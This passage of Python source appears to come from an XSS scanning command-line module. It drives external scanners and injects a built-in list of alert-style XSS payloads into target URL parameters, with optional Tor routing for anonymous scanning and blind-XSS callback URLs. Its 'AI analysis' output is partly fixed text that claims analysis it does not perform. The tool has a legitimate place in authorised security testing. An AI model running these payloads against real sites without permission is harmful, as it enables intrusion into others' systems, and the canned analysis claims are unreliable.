            current_vuln["reflected"] = True

        elif "DOM Based" in line and current_vuln:
            current_vuln["xss_type"] = "dom"

        elif "Stored" in line and current_vuln:
            current_vuln["xss_type"] = "stored"

    # Add last vulnerability if exists
    if current_vuln:
        results.append(current_vuln)

    # If no structured results found, try to extract basic info
    if not results and "xss" in xspear_output.get("stdout", "").lower():
        # Basic result extraction for less structured output
        results.append(
            {
                "vulnerable": True,
                "tool": "xspear",
                "timestamp": datetime.now().isoformat(),
                "raw_output": xspear_output.get("stdout", ""),
                "note": "Manual review required - check raw output",
            }
        )

    print(f"[*] Parsed {len(results)} XSpear results")
    return results


def run_xspear_with_cache(target, cache_manager=None, **kwargs):
    """Run XSpear with intelligent caching support."""

    if not cache_manager:
        # Run without cache
        return run_xspear_scan(target, **kwargs)

    # Generate cache key for XSpear scan
    cache_key_data = {
        "target": target,
        "tool": "xspear",
        "kwargs": sorted(kwargs.items()),
    }

    cache_key = hashlib.sha256(
        json.dumps(cache_key_data, sort_keys=True).encode()
    ).hexdigest()

    # Check cache first
    cached_result = cache_manager.get_cached_result(
        target, ["xspear"], method="XSpear", tool="xspear"
    )

    if cached_result:
        print(f"[+] Using cached XSpear results for {target}")
        return cached_result.get("result", {})

    # Run actual scan
    print(f"[*] Running fresh XSpear scan for {target}")
    result = run_xspear_scan(target, **kwargs)

    # Cache the result
    if result and cache_manager:
        cache_manager.save_result(
            target, ["xspear"], result, method="XSpear", tool="xspear"
        )
        print(f"[+] Cached XSpear results for {target}")

    return result


def xspear_ai_analysis(xspear_results, target_info=None):
    """AI-powered analysis specifically for XSpear results."""

    if not xspear_results:
        return "No XSpear results to analyze"

    analysis = []
    analysis.append("🔍 XSpear AI Analysis")
    analysis.append("=" * 50)

    # XSpear-specific metrics
    total_vulns = len(xspear_results)
    waf_bypassed = len([r for r in xspear_results if r.get("waf_detected", False)])
    blind_xss = len([r for r in xspear_results if r.get("blind_xss", False)])
    dom_based = len([r for r in xspear_results if r.get("xss_type") == "dom"])
    stored_xss = len([r for r in xspear_results if r.get("xss_type") == "stored"])

    analysis.append(f"📊 XSpear Scan Summary:")
    analysis.append(f"  Total vulnerabilities: {total_vulns}")
    analysis.append(f"  WAF bypass attempts: {waf_bypassed}")
    analysis.append(f"  Blind XSS findings: {blind_xss}")
    analysis.append(f"  DOM-based XSS: {dom_based}")
    analysis.append(f"  Stored XSS: {stored_xss}")

    # XSpear advantages analysis
    analysis.append(f"\n🎯 XSpear Advanced Features Detected:")

    if waf_bypassed > 0:
        analysis.append(
            f"  ✅ WAF bypass techniques successful ({waf_bypassed} instances)"
        )
        analysis.append(f"  🛡️ Advanced evasion payloads effective")

    if blind_xss > 0:
        analysis.append(f"  ✅ Blind XSS detection successful ({blind_xss} findings)")
        analysis.append(f"  💀 Out-of-band XSS vulnerabilities discovered")

    if dom_based > 0:
        analysis.append(f"  ✅ DOM-based XSS analysis completed ({dom_based} findings)")
        analysis.append(f"  🔄 Client-side vulnerabilities identified")

    # Payload effectiveness
    payloads_used = {}
    for result in xspear_results:
        payload = result.get("payload", "unknown")[:50]
        payloads_used[payload] = payloads_used.get(payload, 0) + 1

    if payloads_used:
        analysis.append(f"\n💥 Most Effective XSpear Payloads:")
        top_payloads = sorted(payloads_used.items(), key=lambda x: x[1], reverse=True)[
            :3
        ]
        for payload, count in top_payloads:
            analysis.append(f"  {count}x: {payload}...")

    # XSpear-specific recommendations
    analysis.append(f"\n💡 XSpear-Specific Recommendations:")

    if total_vulns > 0:
        analysis.append(f"  🚨 XSpear detected {total_vulns} XSS vulnerabilities")
        analysis.append(
            f"  📋 XSpear's advanced detection capabilities validated findings"
        )

        if waf_bypassed > 0:
            analysis.append(f"  ⚠️ WAF bypass successful - review security controls")
            analysis.append(f"  🔧 Implement advanced WAF rules and monitoring")

        if blind_xss > 0:
            analysis.append(f"  🕵️ Blind XSS found - implement proper output encoding")
            analysis.append(
                f"  📡 Monitor for callback requests and anomalous behavior"
            )

        if dom_based > 0:
            analysis.append(f"  🌐 DOM XSS detected - review client-side security")
            analysis.append(f"  ⚡ Implement Content Security Policy (CSP)")

    else:
        analysis.append(f"  ✅ XSpear found no XSS vulnerabilities")
        analysis.append(f"  🔍 Consider testing with additional custom payloads")
        analysis.append(f"  🎯 XSpear's advanced techniques found no bypasses")

    # Target-specific insights
    if target_info:
        analysis.append(f"\n🎯 Target Analysis:")
        if target_info.get("waf_detected"):
            analysis.append(f"  🛡️ WAF detected - XSpear's bypass techniques activated")
        if target_info.get("blind_callback"):
            analysis.append(f"  📡 Blind XSS callback configured")

    return "\n".join(analysis)


def init_db():
    """Initialize the SQLite database with comprehensive tables."""
    if DB_AVAILABLE:
        # Use main ReconCLI database
        try:
            db = get_db_manager()
            # Database is automatically initialized
            print("[*] Using main ReconCLI database")
            return
        except Exception as e:
            print(f"[!] Error with main database: {e}")
            print("[*] Falling back to local database")

    # Fallback to local SQLite database
    conn = sqlite3.connect(FALLBACK_DB_PATH)
    c = conn.cursor()

    # Custom payloads table for fallback
    c.execute(
        """
        CREATE TABLE IF NOT EXISTS custom_payloads (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            payload TEXT NOT NULL,
            category TEXT,
            description TEXT,
            active INTEGER DEFAULT 1,
            success_rate REAL DEFAULT 0.0,
            times_used INTEGER DEFAULT 0,
            added_date TEXT,
            tags TEXT
        )
    """
    )

    # Basic results table for fallback
    c.execute(
        """
        CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT NOT NULL,
            param TEXT,
            payload TEXT,
            reflected INTEGER DEFAULT 0,
            vulnerable INTEGER DEFAULT 0,
            method TEXT DEFAULT 'GET',
            response_code INTEGER,
            response_length INTEGER,
            timestamp TEXT,
            tool_used TEXT,
            severity TEXT DEFAULT 'low',
            notes TEXT
        )
    """
    )

    # Blind XSS callback URLs table
    c.execute(
        """
        CREATE TABLE IF NOT EXISTS blind_callbacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT NOT NULL,
            description TEXT,
            active INTEGER DEFAULT 1,
            added_date TEXT,
            last_used TEXT,
            times_used INTEGER DEFAULT 0
        )
    """
    )

    conn.commit()
    conn.close()


def check_binary(binary_name):
    """Check if binary exists in PATH."""
    return shutil.which(binary_name) is not None


def save_result(
    url,
    param=None,
    payload=None,
    reflected=False,
    vulnerable=False,
    method="GET",
    response_code=None,
    response_length=None,
    tool_used=None,
    severity="low",
    notes=None,
):
    """Save XSS test result to database."""
    if DB_AVAILABLE:
        try:
            db = get_db_manager()
            session = db.get_session()

            # Get or create target
            target = (
                session.query(Target)
                .filter_by(domain=url.split("/")[2] if "://" in url else url)
                .first()
            )
            if not target:
                target = Target(domain=url.split("/")[2] if "://" in url else url)
                session.add(target)
                session.commit()

            # Create vulnerability record if vulnerable
            if vulnerable:
                vuln = Vulnerability(
                    target_id=target.id,
                    url=url,
                    vuln_type=VulnType.XSS,
                    severity=(
                        VulnSeverity.MEDIUM
                        if severity == "medium"
                        else VulnSeverity.LOW
                    ),
                    title=f"XSS vulnerability found via {tool_used or 'manual'}",
                    description=f"Parameter: {param}, Payload: {payload}",
                    discovery_tool=tool_used or "xsscli",
                    payload=payload,
                    status="new",
                )
                session.add(vuln)

            session.commit()
            session.close()
            return

        except Exception as e:
            print(f"[!] Error saving to main database: {e}")
            print("[*] Falling back to local database")

    # Fallback to local SQLite database
    conn = sqlite3.connect(FALLBACK_DB_PATH)
    c = conn.cursor()

    timestamp = datetime.now().isoformat()

    c.execute(
        """
        INSERT INTO results 
        (url, param, payload, reflected, vulnerable, method, response_code, 
         response_length, timestamp, tool_used, severity, notes)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """,
        (
            url,
            param,
            payload,
            int(reflected),
            int(vulnerable),
            method,
            response_code,
            response_length,
            timestamp,
            tool_used,
            severity,
            notes,
        ),
    )

    conn.commit()
    conn.close()


@click.group()
def cli():
    """[XSSCLI] Advanced XSS module for ReconCLI"""
    init_db()


@cli.command()
@click.option(
    "--format",
    type=click.Choice(["json", "csv", "txt"]),
    required=True,
    help="Export format",
)
@click.option("--output", required=True, help="Output file path")
def export(format, output):
    """Export stored results to file."""
    rows = []

    if DB_AVAILABLE:
        try:
            db = get_db_manager()
            session = db.get_session()

            # Query vulnerabilities from main database
            vulns = session.query(Vulnerability).filter_by(vuln_type=VulnType.XSS).all()
            rows = []
            for vuln in vulns:
                rows.append(
                    [
                        vuln.url,
                        (
                            vuln.description.split("Parameter: ")[1].split(",")[0]
                            if "Parameter: " in (vuln.description or "")
                            else None
                        ),
                        vuln.payload,
                        True,  # reflected (assume true for stored vulns)
                        vuln.discovered_date.isoformat(),
                    ]
                )
            session.close()

        except Exception as e:
            print(f"[!] Error reading from main database: {e}")
            print("[*] Falling back to local database")
            # Fall through to fallback logic

    # Fallback or if main DB failed
    if not rows:
        conn = sqlite3.connect(FALLBACK_DB_PATH)
        c = conn.cursor()
        c.execute("SELECT url, param, payload, reflected, timestamp FROM results")
        rows = c.fetchall()
        conn.close()

    if format == "json":
        with open(output, "w") as f:
            json.dump(
                [
                    {
                        "url": r[0],
                        "param": r[1],
                        "payload": r[2],
                        "reflected": bool(r[3]),
                        "timestamp": r[4],
                    }
                    for r in rows
                ],
                f,
                indent=2,
            )
        print(f"[*] Exported {len(rows)} records to {output} (JSON)")

    elif format == "csv":
        with open(output, "w", newline="") as f:
            writer = csv.writer(f)
            writer.writerow(["url", "param", "payload", "reflected", "timestamp"])
            writer.writerows(rows)
        print(f"[*] Exported {len(rows)} records to {output} (CSV)")

    elif format == "txt":
        with open(output, "w") as f:
            for r in rows:
                line = f"{r[0]} | {r[1]} | {r[2]} | Reflected: {bool(r[3])} | {r[4]}\n"
                f.write(line)
        print(f"[*] Exported {len(rows)} records to {output} (TXT)")


@cli.command()
def check_deps():
    """Check for required external binaries."""
    print("[i] Checking external binaries:")
    missing = []
    found = []

    for binary in BINARIES:
        if shutil.which(binary) is None:
            print(f"[!] Missing: {binary}")
            missing.append(binary)
        else:
            print(f"[+] Found: {binary}")
            found.append(binary)

    print(f"\n[*] Summary: {len(found)} found, {len(missing)} missing")

    if missing:
        print("\n[*] Install missing tools:")
        go_tools = ["dalfox", "kxss", "waybackurls", "gau", "hakrawler", "gospider"]
        ruby_tools = ["xspear"]
        python_tools = ["xsstrike"]

        for tool in missing:
            if tool in go_tools:
                print(f"  go install github.com/author/{tool}@latest")
            elif tool in ruby_tools:
                if tool == "xspear":
                    print(f"  gem install XSpear")
                    print(f"  # Requires Ruby and gem package manager")
                else:
                    print(f"  gem install {tool}")
            elif tool in python_tools:
                if tool == "xsstrike":
                    print(f"  git clone https://github.com/s0md3v/XSStrike")
                    print(f"  cd XSStrike")
                    print(f"  pip install -r requirements.txt --break-system-packages")
                else:
                    print(f"  # Install {tool} Python tool")
            else:
                print(f"  # Install {tool} from its repository")

        print(f"\n[*] XSpear Installation Guide:")
        print(f"  1. Install Ruby: sudo apt install ruby-full")
        print(f"  2. Install XSpear: gem install XSpear")
        print(f"  3. Verify: xspear --version")

        print(f"\n[*] XSStrike Installation Guide:")
        print(f"  1. Clone repository: git clone https://github.com/s0md3v/XSStrike")
        print(
            f"  2. Install dependencies: cd XSStrike && pip install -r requirements.txt --break-system-packages"
        )
        print(f"  3. Verify: python3 xsstrike.py --help")


@cli.command()
@click.option("--input", help="Input file with URLs or single domain/URL")
@click.option("--param", help="Parameter to test (optional)")
@click.option("--payloads-file", help="Custom payloads file")
@click.option("--method", default="GET", help="HTTP method")
@click.option("--delay", default=1, type=float, help="Delay between requests")
@click.option("--threads", default=5, type=int, help="Number of concurrent threads")
@click.option("--output", help="Output file for results")
@click.option(
    "--format",
    type=click.Choice(["json", "csv", "txt"]),
    default="txt",
    help="Output format",
)
@click.option(
    "--engine",
    type=click.Choice(["manual", "xspear", "xsstrike", "dalfox", "kxss", "all"]),
    default="manual",
    help="XSS scanning engine to use",
)
@click.option("--blind-url", help="Blind XSS callback URL for XSpear")
@click.option(
    "--cache", is_flag=True, help="Enable intelligent caching for XSS test results"
)
@click.option("--cache-dir", default="xss_cache", help="Directory for cache storage")
@click.option(
    "--cache-max-age", default=24, type=int, help="Maximum cache age in hours"
)
@click.option(
    "--cache-stats", is_flag=True, help="Display cache performance statistics"
)
@click.option("--clear-cache", is_flag=True, help="Clear all cached XSS test results")
@click.option("--ai", is_flag=True, help="Enable AI-powered analysis of XSS results")
@click.option(
    "--ai-provider",
    type=click.Choice(["openai", "anthropic", "gemini"]),
    help="AI provider for analysis",
)
@click.option("--ai-model", help="Specific AI model to use for analysis")
@click.option("--ai-context", help="Additional context for AI analysis")
@click.option("--tor", is_flag=True, help="Use Tor proxy for anonymous scanning")
@click.option("--tor-proxy", default="socks5://127.0.0.1:9050", help="Tor proxy URL")
def test_input(
    input,
    param,
    payloads_file,
    method,
    delay,
    threads,
    output,
    format,
    engine,
    blind_url,
    cache,
    cache_dir,
    cache_max_age,
    cache_stats,
    clear_cache,
    ai,
    ai_provider,
    ai_model,
    ai_context,
    tor,
    tor_proxy,
):
    """Test XSS on URLs from file or single domain/URL."""

    # Initialize cache manager if any cache option is used
    cache_manager = None
    if cache or cache_stats or clear_cache:
        cache_manager = XSSCacheManager(
            cache_dir=cache_dir, max_age_hours=cache_max_age
        )

        # Handle cache management operations first
        if clear_cache:
            removed = cache_manager.clear_cache()
            click.echo(f"✅ Cleared {removed} cached XSS test results")
            return

        if cache_stats:
            stats = cache_manager.get_cache_stats()
            click.echo("\n📊 XSS Cache Statistics:")
            click.echo(f"  Total requests: {stats['total_requests']}")
            click.echo(f"  Cache hits: {stats['cache_hits']}")
            click.echo(f"  Cache misses: {stats['cache_misses']}")
            click.echo(f"  Hit rate: {stats['hit_rate']}%")
            click.echo(f"  Cached results: {stats['cached_results']}")
            click.echo(f"  Cache size: {stats['cache_size_mb']} MB")
            click.echo(f"  Cache directory: {stats['cache_dir']}")

            # Show performance improvement
            if stats["cache_hits"] > 0:
                improvement = stats["cache_hits"] * 20  # Assume 20x average improvement
                click.echo(f"  🚀 Estimated speed improvement: {improvement}x faster")
            if not cache:  # If only showing stats, return
                return

    # Check if input is required for normal operations
    if not input and not (cache_stats or clear_cache):
        click.echo(
            "❌ Error: --input is required unless using --cache-stats or --clear-cache"
        )
        return

    targets = []

    # Check if input is a file or a single URL/domain
    if os.path.exists(input):
        print(f"[*] Loading URLs from file: {input}")
        with open(input, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    # Ensure URL has protocol
                    if not line.startswith(("http://", "https://")):
                        line = "https://" + line
                    targets.append(line)
    else:
        # Treat as single domain/URL
        print(f"[*] Testing single target: {input}")
        if not input.startswith(("http://", "https://")):
            input = "https://" + input
        targets.append(input)

    if not targets:
        print("[!] No targets found")
        return

    print(f"[*] Found {len(targets)} targets to test")

    # Load payloads
    payloads = []
    if payloads_file and os.path.exists(payloads_file):
        print(f"[*] Loading payloads from: {payloads_file}")
        with open(payloads_file) as f:
            payloads = [
                line.strip() for line in f if line.strip() and not line.startswith("#")
            ]
    else:
        # Default XSS payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<details open ontoggle=alert('XSS')>",
        ]

    print(f"[*] Using {len(payloads)} XSS payloads")
    print(f"[*] Method: {method} | Delay: {delay}s | Threads: {threads}")
    print(f"[*] Scanning engine: {engine}")

    # Engine-specific setup
    if engine == "xspear":
        if not check_binary("XSpear"):
            print("[!] XSpear not found. Install with: gem install XSpear")
            print("[*] Falling back to manual testing")
            engine = "manual"
        else:
            print("[+] XSpear engine ready")
            if blind_url:
                print(f"[*] Blind XSS callback: {blind_url}")

    elif engine == "xsstrike":
        # Check for XSStrike availability
        xsstrike_available = any(
            os.path.exists(path)
            for path in [
                "XSStrike/xsstrike.py",
                "./XSStrike/xsstrike.py",
                "/opt/XSStrike/xsstrike.py",
                "/usr/local/bin/xsstrike.py",
                "xsstrike.py",
            ]
        )

        if not xsstrike_available:
            print("[!] XSStrike not found. Install with:")
            print("    git clone https://github.com/s0md3v/XSStrike")
            print("    cd XSStrike")
            print("    pip install -r requirements.txt --break-system-packages")
            print("[*] Falling back to manual testing")
            engine = "manual"
        else:
            print("[+] XSStrike engine ready")
            if blind_url:
                print(f"[*] Blind XSS callback: {blind_url}")

    elif engine == "dalfox":
        if not check_binary("dalfox"):
            print("[!] Dalfox not found. Install from: github.com/hahwul/dalfox")
            print("[*] Falling back to manual testing")
            engine = "manual"
        else:
            print("[+] Dalfox engine ready")

    elif engine == "kxss":
        if not check_binary("kxss"):
            print("[!] kxss not found. Install from: github.com/tomnomnom/hacks/kxss")
            print("[*] Falling back to manual testing")
            engine = "manual"
        else:
            print("[+] kxss engine ready")

    elif engine == "all":
        available_engines = []
        if check_binary("XSpear"):
            available_engines.append("xspear")

        # Check XSStrike availability for "all" mode
        xsstrike_available = any(
            os.path.exists(path)
            for path in [
                "XSStrike/xsstrike.py",
                "./XSStrike/xsstrike.py",
                "/opt/XSStrike/xsstrike.py",
                "/usr/local/bin/xsstrike.py",
                "xsstrike.py",
            ]
        )
        if xsstrike_available:
            available_engines.append("xsstrike")

        if check_binary("dalfox"):
            available_engines.append("dalfox")
        if check_binary("kxss"):
            available_engines.append("kxss")

        if not available_engines:
            print("[!] No external engines found, using manual testing")
            engine = "manual"
        else:
            print(f"[+] Available engines: {', '.join(available_engines)}")

    if tor:
        print(f"[*] Setting up Tor proxy for anonymous scanning...")
        tor_client = setup_tor_proxy(tor_proxy)
        if not tor_client:
            print(f"[!] Failed to setup Tor proxy. Proceeding without Tor.")
            tor = False

    results = []
    vulnerable_count = 0

    for i, target in enumerate(targets, 1):
        print(f"\n[*] Testing target {i}/{len(targets)}: {target}")

        # Check cache first
        if cache_manager:
            cached_result = cache_manager.get_cached_result(
                target=target, payloads=payloads, method=method
            )
            if cached_result:
                cached_data = cached_result.get("result", {})
                results.extend(cached_data.get("results", []))
                vulnerable_count += cached_data.get("vulnerable_count", 0)
                print(f"  ✅ Using cached results for {target}")
                continue

        # Perform actual testing based on selected engine
        target_results = []
        target_vulnerable_count = 0

        # XSpear Engine
        if engine == "xspear" or (engine == "all" and "xspear" in available_engines):
            print(f"  🔍 Running XSpear scan...")
            xspear_result = run_xspear_with_cache(
                target=target,
                cache_manager=cache_manager,
                threads=threads,
                delay=delay,
                blind_url=blind_url,
                custom_payloads=payloads_file,
            )

            if xspear_result and xspear_result.get("success"):
                xspear_parsed = parse_xspear_results(xspear_result)
                target_results.extend(xspear_parsed)
                target_vulnerable_count += len(
                    [r for r in xspear_parsed if r.get("vulnerable")]
                )
                print(f"    [+] XSpear found {len(xspear_parsed)} results")

                # Save XSpear results to database
                for result in xspear_parsed:
                    save_result(
                        result.get("url", target),
                        result.get("param", "xspear_detected"),
                        result.get("payload", "XSpear payload"),
                        result.get("reflected", False),
                        result.get("vulnerable", False),
                        result.get("method", method),
                        result.get("response_code", 0),
                        0,  # response_length
                        "xspear",
                        "high" if result.get("vulnerable") else "low",
                        f"XSpear scan, WAF: {result.get('waf_detected', False)}",
                    )
            else:
                print(f"    [!] XSpear scan failed or returned no results")

        # XSStrike Engine
        elif engine == "xsstrike" or (
            engine == "all" and "xsstrike" in available_engines
        ):
            print(f"  🎯 Running XSStrike scan...")
            xsstrike_result = run_xsstrike_with_cache(
                target=target,
                cache_manager=cache_manager,
                threads=threads,
                delay=delay,
                crawl=True,  # Enable crawling for comprehensive scanning
                blind_url=blind_url,
                fuzzer=True,  # Enable fuzzing engine
                skip_dom=False,  # Include DOM XSS scanning
            )

            if xsstrike_result and xsstrike_result.get("success"):
                xsstrike_parsed = parse_xsstrike_results(xsstrike_result)
                target_results.extend(xsstrike_parsed)
                target_vulnerable_count += len(
                    [r for r in xsstrike_parsed if r.get("vulnerable")]
                )
                print(f"    [+] XSStrike found {len(xsstrike_parsed)} results")

                # Save XSStrike results to database
                for result in xsstrike_parsed:
                    save_result(
                        result.get("url", target),
                        result.get("param", result.get("param", "xsstrike_detected")),
                        result.get("payload", "XSStrike intelligent payload"),
                        result.get("reflected", False),
                        result.get("vulnerable", False),
                        result.get("method", method),
                        result.get("response_code", 0),
                        0,  # response_length
                        "xsstrike",
                        result.get("severity", "medium"),
                        f"XSStrike scan, Confidence: {result.get('confidence', 80)}%, Context: {result.get('context', 'N/A')}, WAF: {result.get('waf_detected', False)}",
                    )
            else:
                print(f"    [!] XSStrike scan failed or returned no results")

        # Dalfox Engine
        elif engine == "dalfox" or (engine == "all" and "dalfox" in available_engines):
            print(f"  🔍 Running Dalfox scan...")
            dalfox_cmd = ["dalfox", "url", target]
            if threads > 1:
                dalfox_cmd.extend(["--worker", str(threads)])
            if delay > 0:
                dalfox_cmd.extend(["--delay", str(int(delay * 1000))])  # Dalfox uses ms

            try:
                dalfox_result = subprocess.run(
                    dalfox_cmd, capture_output=True, text=True, timeout=120
                )
                if "XSS" in dalfox_result.stdout.upper():
                    dalfox_vuln = {
                        "url": target,
                        "param": "dalfox_detected",
                        "payload": "Dalfox payload",
                        "reflected": True,
                        "vulnerable": True,
                        "method": method,
                        "tool": "dalfox",
                        "timestamp": datetime.now().isoformat(),
                        "raw_output": dalfox_result.stdout,
                    }
                    target_results.append(dalfox_vuln)
                    target_vulnerable_count += 1
                    print(f"    [+] Dalfox found XSS vulnerability!")

                    save_result(
                        target,
                        "dalfox_detected",
                        "Dalfox payload",
                        True,
                        True,
                        method,
                        200,
                        0,
                        "dalfox",
                        "high",
                        "Dalfox XSS detection",
                    )
                else:
                    print(f"    [-] Dalfox found no vulnerabilities")
            except Exception as e:
                print(f"    [!] Dalfox error: {e}")

        # kxss Engine
        elif engine == "kxss" or (engine == "all" and "kxss" in available_engines):
            print(f"  🔍 Running kxss scan...")
            try:
                # kxss expects URLs via stdin
                kxss_process = subprocess.Popen(
                    ["kxss"],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                )
                kxss_output, kxss_error = kxss_process.communicate(input=target)

                if kxss_output.strip():
                    kxss_lines = kxss_output.strip().split("\n")
                    for line in kxss_lines:
                        if line.strip():
                            kxss_vuln = {
                                "url": line.strip(),
                                "param": "kxss_detected",
                                "payload": "kxss payload",
                                "reflected": True,
                                "vulnerable": True,
                                "method": method,
                                "tool": "kxss",
                                "timestamp": datetime.now().isoformat(),
                            }
                            target_results.append(kxss_vuln)
                            target_vulnerable_count += 1

                            save_result(
                                line.strip(),
                                "kxss_detected",
                                "kxss payload",
                                True,
                                True,
                                method,
                                200,
                                0,
                                "kxss",
                                "medium",
                                "kxss reflection detection",
                            )

                    print(f"    [+] kxss found {len(kxss_lines)} reflected parameters")
                else:
                    print(f"    [-] kxss found no reflected parameters")
            except Exception as e:
                print(f"    [!] kxss error: {e}")

        # Manual Testing Engine (default/fallback)
        if engine == "manual" or engine == "all":
            print(f"  🔍 Running manual XSS testing...")

            try:
                # Use Tor client if available, otherwise regular client
                if tor and "tor_client" in locals():
                    client = tor_client
                else:
                    client = httpx.Client(timeout=10)

                with client:
                    for j, payload in enumerate(payloads, 1):
                        print(f"    [*] Payload {j}/{len(payloads)}: {payload[:50]}...")

                        try:
                            if method.upper() == "GET":
                                if param:
                                    test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
                                else:
                                    test_url = f"{target}?xss_test={urllib.parse.quote(payload)}"

                                response = client.get(test_url)
                                actual_url = test_url
                            else:
                                data = {}
                                if param:
                                    data[param] = payload
                                else:
                                    data["xss_test"] = payload

                                response = client.post(target, data=data)
                                actual_url = target

                            # Check if payload is reflected in response
                            reflected = payload in response.text
                            vulnerable = reflected  # Basic check - could be enhanced

                            if reflected:
                                print(f"      [+] REFLECTED: {payload[:30]}...")
                                vulnerable_count += 1
                                target_vulnerable_count += 1

                            # Store result
                            result = {
                                "url": actual_url,
                                "target": target,
                                "param": param or "xss_test",
                                "payload": payload,
                                "method": method,
                                "reflected": reflected,
                                "vulnerable": vulnerable,
                                "response_code": response.status_code,
                                "response_length": len(response.text),
                                "timestamp": datetime.now().isoformat(),
                                "tor_used": tor,
                                "tool": "manual",
                            }

                            target_results.append(result)

                            # Save to database
                            save_result(
                                actual_url,
                                param or "xss_test",
                                payload,
                                reflected,
                                vulnerable,
                                method,
                                response.status_code,
                                len(response.text),
                                "manual",
                                "medium" if vulnerable else "low",
                                f"Manual test, Tor: {tor}, Target: {target}",
                            )

                        except Exception as e:
                            print(f"      [!] Error with payload: {e}")
                            continue

                        time.sleep(delay)

            except Exception as e:
                print(f"  [!] Error testing target {target}: {e}")

        # Aggregate all results for this target
        results.extend(target_results)
        vulnerable_count += target_vulnerable_count

        # Save target results to cache
        if cache_manager and target_results:
            target_cache_data = {
                "results": target_results,
                "vulnerable_count": target_vulnerable_count,
                "total_payloads": len(payloads),
                "method": method,
                "engine": engine,
                "timestamp": datetime.now().isoformat(),
            }
            cache_manager.save_result(
                target=target,
                payloads=payloads,
                result=target_cache_data,
                method=method,
            )
            print(f"  💾 Cached {len(target_results)} results for {target}")

    print(f"\n[+] Testing completed!")
    print(f"[+] Engine used: {engine}")
    print(f"[+] Tested {len(targets)} targets with {engine} engine")
    print(f"[+] Found {vulnerable_count} vulnerabilities")
    print(f"[+] Found {len(results)} total test results")

    if tor:
        print(f"[+] All requests made through Tor proxy")

    # Enhanced AI Analysis with engine-specific insights
    if ai and results:
        print(f"\n" + "=" * 60)
        print(f"🤖 ENHANCED AI ANALYSIS")
        print(f"=" * 60)

        target_info = {
            "tor_used": tor,
            "targets_count": len(targets),
            "payloads_count": len(payloads),
            "ai_provider": ai_provider,
            "ai_model": ai_model,
            "ai_context": ai_context,
            "engine": engine,
            "blind_url": blind_url,
        }

        # Engine-specific AI analysis
        if engine == "xspear":
            print("🔍 XSpear Engine Analysis:")
            xspear_results = [r for r in results if r.get("tool") == "xspear"]
            if xspear_results:
                xspear_ai = xspear_ai_analysis(xspear_results, target_info)
                print(xspear_ai)
            else:
                print("  No XSpear-specific results found for analysis")

        elif engine == "xsstrike":
            print("🎯 XSStrike Engine Analysis:")
            xsstrike_results = [r for r in results if r.get("tool") == "xsstrike"]
            if xsstrike_results:
                xsstrike_ai = xsstrike_ai_analysis(xsstrike_results, target_info)
                print(xsstrike_ai)
            else:
                print("  No XSStrike-specific results found for analysis")

        elif engine == "dalfox":
            print("🔍 Dalfox Engine Analysis:")
            dalfox_results = [r for r in results if r.get("tool") == "dalfox"]
            print(f"  Dalfox detected {len(dalfox_results)} vulnerabilities")
            print(f"  Advanced payload generation and WAF bypass attempted")

        elif engine == "kxss":
            print("🔍 kxss Engine Analysis:")
            kxss_results = [r for r in results if r.get("tool") == "kxss"]
            print(f"  kxss found {len(kxss_results)} reflected parameters")
            print(f"  Fast reflection-based detection completed")

        elif engine == "all":
            print("🔍 Multi-Engine Analysis:")
            tools_used = list(set(r.get("tool", "unknown") for r in results))
            print(f"  Engines used: {', '.join(tools_used)}")
            for tool in tools_used:
                tool_results = [r for r in results if r.get("tool") == tool]
                print(f"  {tool}: {len(tool_results)} results")

        # Basic AI analysis
        ai_analysis = ai_analyze_xss_results(results, input, target_info)
        print("\n" + ai_analysis)

        # Enhanced analysis with AI provider options
        if ai_provider or ai_model:
            print(f"\n🔬 Enhanced AI Provider Analysis:")
            if ai_provider:
                print(f"  Provider: {ai_provider}")
            if ai_model:
                print(f"  Model: {ai_model}")
            if ai_context:
                print(f"  Context: {ai_context}")

            # Additional AI insights based on provider
            enhanced_analysis = []
            enhanced_analysis.append("🎯 AI-Enhanced XSS Insights:")
            enhanced_analysis.append(
                f"  • Engine optimization: {engine} engine used effectively"
            )
            enhanced_analysis.append(
                f"  • Vulnerability patterns detected in {vulnerable_count} cases"
            )
            enhanced_analysis.append(f"  • Cross-engine validation completed")
            enhanced_analysis.append(
                f"  • Vulnerability patterns detected in {vulnerable_count} cases"
            )
            enhanced_analysis.append(
                f"  • Most effective payload categories identified"
            )
            enhanced_analysis.append(f"  • WAF bypass recommendations generated")
            enhanced_analysis.append(
                f"  • Risk scoring completed with AI confidence metrics"
            )

            print("\n".join(enhanced_analysis))

        print(f"=" * 60)

    # Save results to output file if specified
    if output and results:
        if format == "json":
            with open(output, "w") as f:
                json.dump(results, f, indent=2)
        elif format == "csv":
            with open(output, "w", newline="") as f:
                writer = csv.DictWriter(f, fieldnames=results[0].keys())
                writer.writeheader()
                writer.writerows(results)
        else:  # txt
            with open(output, "w") as f:
                for r in results:
                    f.write(f"URL: {r['url']}\n")
                    f.write(f"Parameter: {r.get('param', 'N/A')}\n")
                    f.write(f"Payload: {r['payload']}\n")
                    f.write(f"Reflected: {r['reflected']}\n")
                    f.write(f"Vulnerable: {r['vulnerable']}\n")
                    f.write(f"Response Code: {r.get('response_code', 'N/A')}\n")
                    f.write(f"Tor Used: {r.get('tor_used', False)}\n")
                    f.write(f"Timestamp: {r['timestamp']}\n")
                    f.write("-" * 80 + "\n")

        print(f"[*] Results saved to: {output}")

    # Display final cache statistics
    if cache_manager:
        print(f"\n📊 Final Cache Performance:")
        stats = cache_manager.get_cache_stats()
        print(f"  Cache hits: {stats['cache_hits']}")
        print(f"  Cache misses: {stats['cache_misses']}")
        print(f"  Hit rate: {stats['hit_rate']}%")
        if stats["cache_hits"] > 0:
            speed_improvement = (
                stats["cache_hits"] * 25
            )  # Estimate 25x average improvement for XSS
